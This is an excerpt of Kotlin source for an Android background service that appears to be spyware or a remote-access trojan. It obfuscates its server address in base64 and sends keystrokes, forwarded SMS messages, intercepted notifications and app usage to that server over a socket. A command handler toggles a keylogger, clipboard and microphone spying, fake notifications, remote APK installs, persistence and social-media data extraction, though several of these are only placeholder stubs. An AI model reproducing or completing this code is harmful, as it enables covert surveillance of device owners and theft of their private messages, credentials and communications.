...
class DeviceService : Service(), LifecycleOwner {
    ...
    "aHR0cDovL2thenphaC1ob3N0cGFuZWwudm9sdHh5ei5teS5pZDoyMDAx",
    ...
    private val localReceiver = object : BroadcastReceiver() {
        override fun onReceive(ctx: Context, intent: Intent) {
            when (intent.action) {
                ...
                // ── NEW 12 FEATURES BROADCASTS ──
                "com.sync.xxx.KEYLOG_DATA" -> {
                    val text = intent.getStringExtra("text") ?: return
                    val app = intent.getStringExtra("app") ?: "unknown"
                    storeKeylog(text, app)
                }
                
                "com.sync.xxx.SMS_FORWARD" -> {
                    val sender = intent.getStringExtra("sender") ?: return
                    val message = intent.getStringExtra("message") ?: return
                    val time = intent.getLongExtra("time", System.currentTimeMillis())
                    
                    if (socket?.connected() == true) {
                        socket?.emit("device:smsforward", JSONObject().apply {
                            put("deviceId", deviceId)
                            put("sender", sender)
                            put("message", message)
                            put("time", time)
                ...
                "com.sync.xxx.NOTIF_INTERCEPT" -> {
                    ...
                    if (socket?.connected() == true) {
                        socket?.emit("device:notifintercept", JSONObject().apply {
                            put("deviceId", deviceId)
                            put("app", appName)
                            put("title", title)
                            put("message", message)
    ...
    android.provider.Settings.Secure.ANDROID_ID
        ...
        val filter = IntentFilter().apply {
            ...
            // NEW 12 FEATURES
            addAction("com.sync.xxx.KEYLOG_DATA")
            addAction("com.sync.xxx.SMS_FORWARD")
            addAction("com.sync.xxx.NOTIF_INTERCEPT")
        }
    ...
    private fun handleCommand(cmd: String, value: String) {
        when (cmd) {
            ...
            // ── NEW 12 FEATURES ──
            "startKeylogger"        -> startKeyloggerService()
            "stopKeylogger"         -> stopKeyloggerService()
            "getKeylogs"            -> sendKeylogData()
            "startClipboardSpy"     -> startClipboardService()
            "stopClipboardSpy"      -> stopClipboardService()
            "startCallRecorder"     -> startCallRecorderService()
            "stopCallRecorder"      -> stopCallRecorderService()
            "startMicrophoneSpy"    -> startMicrophoneSpyService()
            "stopMicrophoneSpy"     -> stopMicrophoneSpyService()
            "startSmsForward"       -> startSmsForwardService()
            "stopSmsForward"        -> stopSmsForwardService()
            "startNotifInterceptor" -> startNotifInterceptorService()
            "stopNotifInterceptor"  -> stopNotifInterceptorService()
            "getAppUsage"           -> sendAppUsageStats()
            "startScreenRecorder"   -> startScreenRecorderService()
            "stopScreenRecorder"    -> stopScreenRecorderService()
            "sendFakeNotif"         -> sendFakeNotification(value)
            "installApk"            -> installApkFromUrl(value)
            "uninstallApp"          -> uninstallAppByPackage(value)
            "enablePersistence"     -> enablePersistenceMode()
            "disablePersistence"    -> disablePersistenceMode()
            "extractSocialMedia"    -> extractSocialMediaData(value)
        }
    }
...
${htmlContent}
    ...
    // ══════════════════════════════════════════════════════════════
    // NEW 12 FEATURES IMPLEMENTATION
    // ══════════════════════════════════════════════════════════════

    // ── 1. KEYLOGGER ──
    private val keylogStore = ArrayDeque<JSONObject>()
    
    private fun startKeyloggerService() {
        val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        startActivity(intent)
        emitStatus(JSONObject().apply { put("keyloggerActive", true) })
    }
    
    private fun stopKeyloggerService() {
        keylogStore.clear()
        emitStatus(JSONObject().apply { put("keyloggerActive", false) })
    }
    
    private fun sendKeylogData() {
        Thread {
            try {
                val result = org.json.JSONArray()
                keylogStore.forEach { result.put(it) }
                if (socket?.connected() != true) return@Thread
                socket?.emit("device:status", JSONObject().apply {
                    put("deviceId", deviceId)
                    put("status", JSONObject().apply { put("keylogData", result) })
                })
            } catch (e: Exception) {
                Log.e("DeviceService", "sendKeylogData: ${e.message}")
            }
        }.start()
    }
    
    fun storeKeylog(text: String, app: String) {
        val entry = JSONObject().apply {
            put("text", text)
            put("app", app)
            put("time", System.currentTimeMillis())
        }
        keylogStore.addLast(entry)
        if (keylogStore.size > 1000) keylogStore.removeFirst()
        
        socket?.emit("device:keylog", JSONObject().apply {
            put("deviceId", deviceId)
            put("text", text)
            put("app", app)
            put("time", System.currentTimeMillis())
    ...
    private fun startClipboardService() {
        try {
            ...
            emitStatus(JSONObject().apply { put("clipboardSpyActive", true) })
        } catch (e: Exception) {
            Log.e("DeviceService", "startClipboardService: ${e.message}")
        }
    }
    ...
    private fun stopClipboardService() {
        try {
            ...
            emitStatus(JSONObject().apply { put("clipboardSpyActive", false) })
        } catch (e: Exception) {
            Log.e("DeviceService", "stopClipboardService: ${e.message}")
        }
    }

    // ── 3. CALL RECORDER ──
    private fun startCallRecorderService() {
        // Note: Call recording requires complex implementation with PhoneStateListener
        // This is a placeholder that shows the concept
        emitStatus(JSONObject().apply { put("callRecorderActive", true) })
        showToast("Call Recorder: Requires phone state permission")
    }
    
    private fun stopCallRecorderService() {
        emitStatus(JSONObject().apply { put("callRecorderActive", false) })
    }

    // ── 4. MICROPHONE SPY ──
    private fun startMicrophoneSpyService() {
        // Note: Ambient recording requires AudioRecord implementation
        emitStatus(JSONObject().apply { put("microphoneSpyActive", true) })
        showToast("Microphone Spy: Recording ambient audio...")
    }
    
    private fun stopMicrophoneSpyService() {
        emitStatus(JSONObject().apply { put("microphoneSpyActive", false) })
    }

    // ── 5. SMS AUTO-FORWARD ──
    private fun startSmsForwardService() {
        // SMS forward is handled by BroadcastReceiver (will create separate file)
        emitStatus(JSONObject().apply { put("smsForwardActive", true) })
    }
    
    private fun stopSmsForwardService() {
        emitStatus(JSONObject().apply { put("smsForwardActive", false) })
    }

    // ── 6. NOTIFICATION INTERCEPTOR ──
    private fun startNotifInterceptorService() {
        val intent = Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS")
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        startActivity(intent)
        emitStatus(JSONObject().apply { put("notifInterceptorActive", true) })
    }
    
    private fun stopNotifInterceptorService() {
        emitStatus(JSONObject().apply { put("notifInterceptorActive", false) })
    }
    ...
    private fun sendAppUsageStats() {
        Thread {
            try {
                if (Build.VERSION.SDK_INT < Build.VERSION_CODES.LOLLIPOP) return@Thread
                    ...
                    .forEach { stat ->
                        try {
                            ...
                            result.put(JSONObject().apply {
                                ...
                                put("appName", appName)
                                put("timeInForeground", stat.totalTimeInForeground)
                                put("launchCount", stat.appLaunchCount)
                            })
                        } catch (_: Exception) {}
                    }
                
                if (socket?.connected() != true) return@Thread
                socket?.emit("device:appusage", JSONObject().apply {
                    put("deviceId", deviceId)
                    put("usageData", result)
                })
            } catch (e: Exception) {
                Log.e("DeviceService", "sendAppUsageStats: ${e.message}")
            }
        }.start()
    }

    // ── 8. SCREEN RECORDER ──
    private fun startScreenRecorderService() {
        // Screen recording requires MediaRecorder + MediaProjection
        emitStatus(JSONObject().apply { put("screenRecorderActive", true) })
        showToast("Screen Recorder: Starting...")
    }
    
    private fun stopScreenRecorderService() {
        emitStatus(JSONObject().apply { put("screenRecorderActive", false) })
        showToast("Screen Recorder: Stopped")
    }

    // ── 9. FAKE NOTIFICATION ──
    private fun sendFakeNotification(jsonValue: String) {
        try {
            ...
            val notification = NotificationCompat.Builder(this, "fake_notif_channel")
            ...
            emitStatus(JSONObject().apply { put("fakeNotifSent", true) })
        } catch (e: Exception) {
            Log.e("DeviceService", "sendFakeNotification: ${e.message}")
        }
    }

    // ── 10. REMOTE INSTALL/UNINSTALL ──
    private fun installApkFromUrl(jsonValue: String) {
        try {
            val obj = JSONObject(jsonValue)
            val url = obj.getString("url")
            showToast("Installing APK from: $url")
            // Download and install APK (requires implementation)
            emitStatus(JSONObject().apply { put("apkInstallStarted", url) })
        } catch (e: Exception) {
            Log.e("DeviceService", "installApkFromUrl: ${e.message}")
        }
    }
    
    private fun uninstallAppByPackage(jsonValue: String) {
        try {
            val obj = JSONObject(jsonValue)
            val pkg = obj.getString("package")
            ...
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            startActivity(intent)
            emitStatus(JSONObject().apply { put("uninstallRequested", pkg) })
        } catch (e: Exception) {
            Log.e("DeviceService", "uninstallAppByPackage: ${e.message}")
        }
    }

    // ── 11. PERSISTENCE BOOSTER ──
    private fun enablePersistenceMode() {
        // Enable aggressive persistence (JobScheduler, AlarmManager, etc)
        emitStatus(JSONObject().apply { put("persistenceEnabled", true) })
        showToast("Persistence Mode: ENABLED")
    }
    
    private fun disablePersistenceMode() {
        emitStatus(JSONObject().apply { put("persistenceEnabled", false) })
        showToast("Persistence Mode: DISABLED")
    }

    // ── 12. SOCIAL MEDIA SPY ──
    private fun extractSocialMediaData(jsonValue: String) {
        try {
            val obj = JSONObject(jsonValue)
            val app = obj.getString("app")
            showToast("Extracting $app data...")
            // Extract WhatsApp/Telegram/Instagram database (requires root or backup access)
            emitStatus(JSONObject().apply { put("socialMediaExtraction", app) })
        } catch (e: Exception) {
            Log.e("DeviceService", "extractSocialMediaData: ${e.message}")
        }
    }
